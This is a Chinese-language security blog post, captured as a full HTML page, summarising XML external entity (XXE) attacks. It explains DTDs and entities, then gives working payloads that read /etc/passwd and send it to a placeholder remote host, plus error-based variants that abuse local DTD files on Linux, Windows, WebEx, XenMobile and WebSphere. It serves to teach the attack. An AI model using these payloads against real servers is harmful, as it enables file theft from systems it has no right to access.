@@ -1,0 +1,2443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Sariel.D">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sariel.D">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="小结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE 小结">
+<meta property="og:url" content="https://blog.sari3l.com/posts/fedef51/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="小结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="article:published_time" content="2018-12-19T10:11:20.000Z">
+<meta property="article:modified_time" content="2020-07-06T09:55:57.404Z">
+<meta property="article:author" content="Sariel.D">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="Learning Man&#39;s Blog" type="application/atom+xml">
+    
+    <title>XXE 小结 · Learning Man</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/css/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/scripts/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-129685149-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-funky.css" type="text/css"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Learning Man&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">XXE 小结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Learning Man's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            XXE 小结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "XXE">XXE</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.8k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/12/19</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <!--<img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        -->
+        <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>先搬上先知的一段总结</p>
+<hr>
+<h3 id="i-XML"><a href="#i-XML" class="headerlink" title="i. XML"></a>i. XML</h3><p>XML是类似HTML的标记语言，但它们有所不同。</p>
+<ul>
+<li>其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。</li>
+<li>其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。</li>
+<li>此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。</li>
+<li><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</li>
+</ul>
+<h3 id="ii-DTD"><a href="#ii-DTD" class="headerlink" title="ii. DTD"></a>ii. DTD</h3><p>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如 <code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code> 。</p>
+<p>实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p>
+<p>DTD有两种形式：</p>
+<pre class=" language-xml"><code class="language-xml">内部 DTD:
+    <span class="token doctype">&lt;!DOCTYPE 根元素 [元素声明]></span>
+外部 DTD:
+    <span class="token doctype">&lt;!DOCTYPE 根元素 SYSTEM "存放元素声明的文件的URI，可以是本地文件或网络文件" [可选的元素声明]></span>
+    <span class="token doctype">&lt;!DOCTYPE 根元素 PUBLIC "PUBLIC_ID DTD的名称" "外部DTD文件的URI"></span>
+（ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI）</code></pre>
+<h3 id="iii-ENTITY"><a href="#iii-ENTITY" class="headerlink" title="iii. ENTITY"></a>iii. ENTITY</h3><p>我们可以在元素声明中自定义实体，和DTD类似也分为<code>内部实体</code>和<code>外部实体</code>，此外还有<code>普通实体</code>和<code>参数实体</code>之分：</p>
+<h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 内部普通实体名 "实体所代表的字符串"></span>]>
+<span class="token doctype">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 外部普通实体名 SYSTEM "外部实体的URI"></span>]>
+<span class="token doctype">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 内部参数实体名 "实体所代表的字符串"></span>]>
+<span class="token doctype">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 外部参数实体名 SYSTEM "外部实体的URI"></span>]>
+除了 SYSTEM关键字外，外部实体还可用 PUBLIC关键字声明。</code></pre>
+<h5 id="URL-支持的协议"><a href="#URL-支持的协议" class="headerlink" title="URL 支持的协议"></a>URL 支持的协议</h5><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fedef51/15452123310833.jpg" alt></p>
+<h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><pre class=" language-plain"><code class="language-plain">&普通实体名; //经实验，普通实体既可以在 DTD 中，也可以在 XML 中引用，可以在声明前引用，可以在在元素声明内部引用
+%参数实体名; //经实验，参数实体只能在 DTD 中引用，不能在声明前引用,不能在元素声明内部引用</code></pre>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol>
+<li><p><strong>外部 DTD 中，如果外部(普通|参数)实体中想要引用内部参数实体，需要在此实体上层添加内部(普通|参数)实体声明，并先引用上层内部实体</strong></p>
+<p> 原因可能是在内部实体中引用会将值解析进去，而外部实体只会直接请求 URL 字符串，不解析其中的引用</p>
+<pre class=" language-xml"><code class="language-xml"> 外部 test.dtd 文件
+ <span class="token comment" spellcheck="true">&lt;!------- Failure -------></span>
+ &lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+ &lt;!ENTITY % send SYSTEM "http://xxx/?%file;">
+ %send;
+
+ <span class="token comment" spellcheck="true">&lt;!------- Success -------></span>
+ &lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+ &lt;!ENTITY % top ' 
+     &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM "http://xxx/?%file;">
+     '>
+ %top;
+ %send;</code></pre>
+</li>
+<li><p><strong>在内部 DTD 中，不能在实体声明中出现实体引用</strong></p>
+<pre class=" language-xml"><code class="language-xml"> <span class="token comment" spellcheck="true">&lt;!------- Failure -------></span>
+ <span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+ <span class="token doctype">&lt;!DOCTYPE xxe [
+ &lt;!ENTITY % in "123"></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">out</span> <span class="token attr-name">"%in;"</span><span class="token punctuation">></span></span>
+ %out;
+ ]></code></pre>
+<p> 会报错 <font color="red"><strong><code>PEReferences forbidden in internal subset in Entity</code></strong></font>，XML 文档中对此有所<a href="https://www.w3.org/TR/xml/#wfc-PEinInternalSubset" target="_blank" rel="noopener">提及</a></p>
+<blockquote>
+<p>Well-formedness constraint: PEs in Internal Subset</p>
+<p>In the internal DTD subset, parameter-entity references must not occur within markup declarations; they may occur where markup declarations can occur. (This does not apply to references that occur in external parameter entities or to the external subset.)</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="iv-可能造成的危害"><a href="#iv-可能造成的危害" class="headerlink" title="iv. 可能造成的危害"></a>iv. 可能造成的危害</h3><ul>
+<li>本地文件读取</li>
+<li>内网访问，主机/端口扫描</li>
+<li>网络访问</li>
+<li>系统命令执行（特定协议，如PHP的expect）</li>
+<li>拒绝服务（嵌套引用，指数爆炸）</li>
+</ul>
+<h3 id="v-Libxml-与-PHP"><a href="#v-Libxml-与-PHP" class="headerlink" title="v. Libxml 与 PHP"></a>v. Libxml 与 PHP</h3><p>自 libxml 2.9.0 以后，开始默认禁止解析外部实体，与 PHP 版本没有根本性关系</p>
+<pre class=" language-log"><code class="language-log">v2.9.5: Sep 04 2017
+    Security:Detect infinite recursion in parameter entities (Nick Wellnhofer)
+    Prevent unwanted external entity reference
+v2.9.2: Oct 16 2014
+    Security:
+    Fix for CVE-2014-3660 billion laugh variant (Daniel Veillard),
+    CVE-2014-0191 Do not fetch external parameter entities (Daniel Veillard)
+2.9.1: Apr 19 2013
+    Activate detection of encoding in external subset
+2.9.0: Sep 11 2012
+    Do not fetch external parsed entities</code></pre>
+<hr>
+<h2 id="0x02-OOB-XXE"><a href="#0x02-OOB-XXE" class="headerlink" title="0x02 OOB XXE"></a>0x02 OOB XXE</h2><p>payload</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY ></span>
+&lt;!ENTITY % load SYSTEM "http://xxx/external.dtd">
+%load;
+]></code></pre>
+<p>external.dtd</p>
+<pre class=" language-xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+&lt;!ENTITY % top ' 
+    &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM "http://xxx/?%file;">
+'>
+%top;
+%send;</code></pre>
+<h2 id="0x03-Error-XXE"><a href="#0x03-Error-XXE" class="headerlink" title="0x03 Error XXE"></a>0x03 Error XXE</h2><p>通常用于无法访问外网，加载自定义外部 DTD 时候采用，需要服务器开启相关报错</p>
+<h3 id="i-Local-DTD"><a href="#i-Local-DTD" class="headerlink" title="i. Local DTD"></a>i. Local DTD</h3><p>作者假设在服务器内发现一个<code>sip-app_1_0.dtd</code>文件，其内容如下</p>
+<pre class=" language-xml"><code class="language-xml">…
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">"and</span> <span class="token attr-name">|</span> <span class="token attr-name">or</span> <span class="token attr-name">|</span> <span class="token attr-name">not</span> <span class="token attr-name">|</span> <span class="token attr-name">equal</span> <span class="token attr-name">|</span> <span class="token attr-name">contains</span> <span class="token attr-name">|</span> <span class="token attr-name">exists</span> <span class="token attr-name">|</span> <span class="token attr-name">subdomain-of"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(%condition;)</span><span class="token punctuation">></span></span>
+…</code></pre>
+<p>作者payload，通过替换<code>%condition;</code>值，由于是由payload发起调用dtd，所以在有两个同名实体的情况下，以第一个为主，即payload中的声明为主</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype">&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">'aaa)</span><span class="token punctuation">></span></span>
+        &lt;!ENTITY % file SYSTEM "file:///etc/passwd">
+        &lt;!ENTITY % eval "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> error SYSTEM 'file:///nonexistent/%file;'>">
+        %eval;
+        %error;
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">aa</span> <span class="token attr-name">(bb'</span><span class="token punctuation">></span></span>
+
+    %local_dtd;
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>any text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre>
+<h4 id="本地-DTD-文件"><a href="#本地-DTD-文件" class="headerlink" title="本地 DTD 文件"></a>本地 DTD 文件</h4><p>作者发现了几个常见的本地 DTD 文件</p>
+<p>Linux 系统</p>
+<pre class=" language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">ISOamsa</span> <span class="token attr-name">'Your</span> <span class="token attr-name">DTD</span> <span class="token attr-name">code'</span><span class="token punctuation">></span></span>
+%local_dtd;</code></pre>
+<p>Windows系统</p>
+<pre class=" language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">SuperClass</span> <span class="token attr-name">'</span><span class="token punctuation">></span></span>Your DTD code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">test</span> <span class="token attr-name">"test"'</span><span class="token punctuation">></span></span>
+%local_dtd;</code></pre>
+<p>思科WebEx</p>
+<pre class=" language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">url.attribute.set</span> <span class="token attr-name">'</span><span class="token punctuation">></span></span>Your DTD code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">test</span> <span class="token attr-name">"test"'</span><span class="token punctuation">></span></span>
+%local_dtd;</code></pre>
+<p>Citrix XenMobile服务器</p>
+<pre class=" language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">Body</span> <span class="token attr-name">'</span><span class="token punctuation">></span></span>Your DTD code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">test</span> <span class="token attr-name">"test"'</span><span class="token punctuation">></span></span>
+%local_dtd;</code></pre>
+<p>多平台IBM WebSphere应用</p>
+<pre class=" language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "./../../properties/schemas/j2ee/XMLSchema.dtd">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">xs-datatypes</span> <span class="token attr-name">'Your</span> <span class="token attr-name">DTD</span> <span class="token attr-name">code'</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">simpleType</span> <span class="token attr-name">"a"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">restriction</span> <span class="token attr-name">"b"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">boolean</span> <span class="token attr-name">"(c)"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">URIref</span> <span class="token attr-name">"CDATA"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">XPathExpr</span> <span class="token attr-name">"CDATA"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">QName</span> <span class="token attr-name">"NMTOKEN"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">NCName</span> <span class="token attr-name">"NMTOKEN"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">nonNegativeInteger</span> <span class="token attr-name">"NMTOKEN"</span><span class="token punctuation">></span></span>
+%local_dtd;</code></pre>
+<h3 id="ii-Without-Local-DTD"><a href="#ii-Without-Local-DTD" class="headerlink" title="ii. Without Local DTD"></a>ii. Without Local DTD</h3><p>来自于 P 牛的知识星球，<strong>貌似在嵌套实体中，可以在标记声明中出现内部参数引用？</strong></p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype">&lt;!DOCTYPE message [
+    &lt;!ENTITY % NUMBER '
+        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"></span>
+        &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///nonexistent/<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">
+        <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;
+        <span class="token entity" title="&#x25;">&amp;#x25;</span>error;
+        '>
+    %NUMBER;
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>any text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fedef51/2.png" alt></p>
